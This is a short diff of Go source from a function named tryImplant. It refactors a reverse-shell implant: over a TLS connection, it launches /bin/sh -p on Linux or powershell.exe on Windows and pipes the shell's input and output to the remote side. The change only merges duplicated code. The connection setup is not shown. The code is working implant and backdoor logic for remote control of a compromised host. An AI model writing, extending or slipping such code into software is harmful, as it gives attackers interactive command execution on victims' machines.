@@ -124,24 +124,20 @@ func tryImplant(conf *tls.Config) {
 	defer c.Close()
 
 	/* Upgrade to a shell */
+	var s *exec.Cmd
 	switch os := runtime.GOOS; os {
 	case "linux":
-		s := exec.Command("/bin/sh", "-p")
-		s.Stdin = c
-		s.Stdout = c
-		s.Stderr = c
-		if err := s.Run(); nil != err {
-			debugf("Shell: %s", err)
-		}
+		s = exec.Command("/bin/sh", "-p")
 
 	case "windows":
-		s := exec.Command("powershell.exe")
-		s.Stdin = c
-		s.Stdout = c
-		s.Stderr = c
-		if err := s.Run(); nil != err {
-			debugf("Windows :( %s", err)
-		}
+		s = exec.Command("powershell.exe")
+	}
+
+	s.Stdin = c
+	s.Stdout = c
+	s.Stderr = c
+	if err := s.Run(); nil != err {
+		debugf("Shell: %s", err)
 	}
 }
 
